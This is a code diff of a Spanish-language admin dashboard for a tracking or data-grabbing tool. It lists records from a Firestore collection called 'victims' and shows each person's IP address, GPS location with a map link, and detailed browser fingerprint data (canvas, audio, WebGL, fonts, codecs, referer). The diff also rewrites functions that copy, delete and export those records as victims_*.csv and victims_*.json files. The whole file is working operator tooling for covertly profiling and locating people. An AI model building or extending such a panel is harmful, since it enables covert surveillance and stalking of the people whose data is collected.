+    <div class="grid">${R([['hash','a'],['canvas','d'],['audio','d'],['glUVendor',''],['glURenderer',''],['glVer','d'],['glMax','d'],['fonts','d'],['fontN',''],['wasm',''],['webGPU',''],['ptrFine',''],['ptrCoarse','']])}</div>
+    <div class="st">🎬 Codecs / URL</div>
+    <div class="grid">${R([['h264',''],['vp9',''],['mp3',''],['ogg',''],['referer',''],['url','d'],['params','d'],['ts','d'],['_exit','d']])}</div>
+    <div class="acts">
+      <button class="btn" onclick="cpJSON('${id}')">📋 JSON</button>
+      <button class="btn" onclick="cpIP('${id}')">📌 IP</button>
+      ${hasGPS&&lat?`<a class="btn" href="https://maps.google.com/?q=${lat},${lon}" target="_blank" style="text-decoration:none;color:var(--dim)">🗺</a>`:''}
+      <button class="btn" style="margin-left:auto" onclick="del('${id}')">🗑</button>
     </div>
   </div>
 </div>`;
 }
 
-// ════════════════════════════════════════════
-// TOGGLE / COPY / DELETE
-// ════════════════════════════════════════════
-function toggleCard(id) {
-  document.getElementById('body-' + id).classList.toggle('open');
-  document.getElementById('arr-'  + id).classList.toggle('open');
-}
+// ── ACTIONS ───────────────────────────────────────────
+window.tog=(id)=>{
+  document.getElementById('cb-'+id).classList.toggle('o');
+  document.getElementById('ar-'+id).classList.toggle('o');
+};
 
-function copyJSON(id) {
-  const e = allEntries.find(e => e.id === id);
-  if (!e) return;
-  const txt = JSON.stringify(e.data, null, 2);
-  navigator.clipboard?.writeText(txt).catch(() => legacyCopy(txt));
-  const btn = document.querySelector('#card-' + id + ' .btn-sm');
-  if (btn) { btn.textContent = '✓'; setTimeout(() => btn.textContent = '📋 JSON', 1500); }
-}
+window.cpJSON=(id)=>{
+  const e=all.find(x=>x.id===id); if(!e) return;
+  const t=JSON.stringify(e.data,null,2);
+  navigator.clipboard?.writeText(t).catch(()=>lcp(t));
+  const b=document.querySelector('#c-'+id+' .btn');
+  if(b){b.textContent='✓';setTimeout(()=>b.textContent='📋 JSON',1500);}
+};
 
-function copyIP(id) {
-  const e = allEntries.find(e => e.id === id);
-  if (!e) return;
-  const d = e.data, ip = d.ip || d.ip_public || d.ipLocal1 || '';
-  navigator.clipboard?.writeText(ip).catch(() => legacyCopy(ip));
-}
+window.cpIP=(id)=>{
+  const e=all.find(x=>x.id===id); if(!e) return;
+  const ip=e.data.ip||e.data.ipLocal1||'';
+  navigator.clipboard?.writeText(ip).catch(()=>lcp(ip));
+};
 
-function legacyCopy(txt) {
-  const ta = document.createElement('textarea');
-  ta.value = txt; document.body.appendChild(ta); ta.select();
-  document.execCommand('copy'); document.body.removeChild(ta);
-}
+function lcp(t){const a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();document.execCommand('copy');document.body.removeChild(a);}
 
-async function delEntry(id) {
-  if (!confirm('¿Eliminar?')) return;
-  try {
-    const r = await fetch(`${FS}/victims/${id}?key=${FB_KEY}`, { method: 'DELETE' });
-    if (r.ok || r.status === 404) {
-      allEntries = allEntries.filter(e => e.id !== id);
-      renderAll(); updateStats();
-    }
-  } catch(e) { alert('Error: ' + e.message); }
-}
+window.del=async(id)=>{
+  if(!confirm('¿Eliminar?')) return;
+  try{ await deleteDoc(doc(db,'victims',id)); } catch(e){ alert('Error: '+e.message); }
+};
 
-// ════════════════════════════════════════════
-// EXPORT
-// ════════════════════════════════════════════
-function exportCSV() {
-  if (!allEntries.length) { alert('Sin datos'); return; }
-  const keys = [...new Set(allEntries.flatMap(e => Object.keys(e.data)))].sort();
-  const esc  = v => '"' + String(v).replace(/"/g, '""') + '"';
-  const rows = [
-    ['id', ...keys].map(esc).join(','),
-    ...allEntries.map(e => [esc(e.id), ...keys.map(k => esc(e.data[k] ?? ''))].join(','))
-  ].join('\r\n');
-  dl('victims_' + Date.now() + '.csv', rows, 'text/csv');
-}
+// ── EXPORT ────────────────────────────────────────────
+window.xCSV=()=>{
+  if(!all.length){alert('Sin datos');return;}
+  const keys=[...new Set(all.flatMap(e=>Object.keys(e.data)))].sort();
+  const esc=v=>'"'+String(v).replace(/"/g,'""')+'"';
+  const rows=[['id',...keys].map(esc).join(','),
+    ...all.map(e=>[esc(e.id),...keys.map(k=>esc(e.data[k]??''))].join(','))].join('\r\n');
+  dl('victims_'+Date.now()+'.csv',rows,'text/csv');
+};
 
-function exportJSON() {
-  if (!allEntries.length) { alert('Sin datos'); return; }
-  dl('victims_' + Date.now() + '.json',
-     JSON.stringify(allEntries.map(e => ({ id: e.id, ...e.data })), null, 2),
-     'application/json');
-}
+window.xJSON=()=>{
+  if(!all.length){alert('Sin datos');return;}
+  dl('victims_'+Date.now()+'.json',JSON.stringify(all.map(e=>({id:e.id,...e.data})),null,2),'application/json');
+};
 
-function dl(name, content, mime) {
-  const a = document.createElement('a');
-  a.href     = URL.createObjectURL(new Blob([content], { type: mime }));
-  a.download = name;
-  document.body.appendChild(a); a.click(); document.body.removeChild(a);
+function dl(name,content,mime){
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([content],{type:mime}));
+  a.download=name; document.body.appendChild(a); a.click(); document.body.removeChild(a);
 }
 </script>
 </body>
